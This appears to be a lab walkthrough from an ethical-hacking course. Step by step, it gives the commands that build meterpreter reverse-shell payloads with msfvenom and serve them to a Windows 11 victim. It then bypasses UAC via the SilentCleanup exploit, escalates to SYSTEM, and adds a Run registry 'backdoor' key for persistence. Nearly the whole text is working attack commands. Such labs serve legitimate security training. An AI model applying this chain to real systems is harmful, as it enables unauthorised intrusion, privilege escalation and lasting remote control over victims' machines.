
to switch to the **Parrot Security** machine and login with **attacker/toor**

Open a **Terminal** window and execute **sudo su** to run the programs as a root user (When prompted, enter the password **toor**). Run **cd** command to jump to the root directory

Run the command **msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Test.exe** to generate **Test.exe** payload

Now, we will create payload that needs to be uploaded into the Run Registry of **Windows 11** machine. Run the following command:

**msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=4444 -f exe > /home/attacker/Desktop/registry.exe**

In the previous lab, we already created a directory or shared folder (share) at the location (/var/www/html) with the required access permission. So, we will use the same directory or shared folder (share) to share exploit.exe with the victim machine.

To create a new directory to share the **Test.exe** and **registry.exe** files with the target machine and provide the permissions, use the below commands:

- Run **mkdir /var/www/html/share** command to create a shared folder
- Run **chmod -R 755 /var/www/html/share** command
- Run **chown -R www-data:www-data /var/www/html/share** command

Copy the payload into the shared folder by executing **cp /home/attacker/Desktop/Test.exe /var/www/html/share/** and **cp /home/attacker/Desktop/registry.exe /var/www/html/share/** commands

Start the Apache server by running **service apache2 start** command

Run **msfconsole** command to launch Metasploit Framework

  
In Metasploit, type **use exploit/multi/handler** and press **Enter**

Now, type **set payload windows/meterpreter/reverse_tcp** and press **Enter**

Type **set lhost 10.10.1.13** and press **Enter** to set lhost

Type **set lport 444** and press **Enter** to set lport

Now, type **run** in the Metasploit console and press **Enter**

o switch to the **Windows 11** machine, click [Ctrl+Alt+Delete](https://labclient.labondemand.com/Instructions/b23f3920-d498-4113-9bbb-12cd16f9c53f#) to activate the machine and login

Open any web browser (here, **Mozilla Firefox**) go to **http://10.10.1.13/share**. As soon as you press enter, it will display the shared folder contents

Click on **Test.exe** and **registry.exe** to download the files

Navigate to **Downloads** and double-click the **Test.exe** file

Leave the **Windows 11** machine running and click [Parrot Security](https://labclient.labondemand.com/Instructions/b23f3920-d498-4113-9bbb-12cd16f9c53f#) to switch to the **Parrot Security** machine

The meterpreter session has successfully been opened

Type **getuid** and press **Enter** to display current user ID

Now, we shall try to bypass the User Account Control setting that is blocking you from gaining unrestricted access to the machine

Type **background** and press **Enter**, to background the current session
In this task, we will bypass Windows UAC protection via SilentCleanup task present in Windows Task Scheduler. It is present in Metasploit as a bypassuac_silentcleanup exploit

In the terminal window, type **use exploit/windows/local/bypassuac_silentcleanup** and press **Enter**

Now, type **set session 1** and press **Enter**
  
Type **show options** in the meterpreter console and press **Enter**.

To set the **LHOST** option, type **set LHOST 10.10.1.13** and press **Enter**

To set the **TARGET** option, type **set TARGET 0** and press **Enter** (here, 0 indicates nothing, but the Exploit Target ID

Type **exploit** and press **Enter** to begin the exploit on **Windows 11** machine
If you get **Exploit completed, but no session was created** message without any session, type **exploit** in the console again and press **Enter**

The BypassUAC exploit has successfully bypassed the UAC setting on the **Windows 11** machine

Type **getsystem -t 1** and press **Enter** to elevate privileges

Now, type **getuid** and press **Enter**. The Meterpreter session is now running with system privileges

Now, to add the malicious file into the **Windows 11** machine's registry, open a shell by running the **shell** command

In the elevated shell, type **reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"** and press **Enter**

Once the command is successfully executed, open another terminal window with root privileges and run **msfconsole** command

In Metasploit, type **use exploit/multi/handler** and press **Enter**

Now, type **set payload windows/meterpreter/reverse_tcp** and press **Enter**

Type **set lhost 10.10.1.13** and press **Enter** to set lhost

Type **set lport 4444** and press **Enter** to set lport

Now, type **exploit** to start the exploitation

to switch to **Windows 11** machine login to **Admin** account and restart the machine so that the malicious file that is placed in the Run Registry is executed

to switch to the **Parrot Security** machine and you can see that the meterpreter session is opened

Type **getuid** and press **Enter**, we can see that we have opened a reverse shell with admin privileges

Whenever the Admin restarts the system, a reverse shell is opened to the attacker until the payload is detected by the administrator

Thus, attacker can maintain persistence on the target machine using Run Registry keys



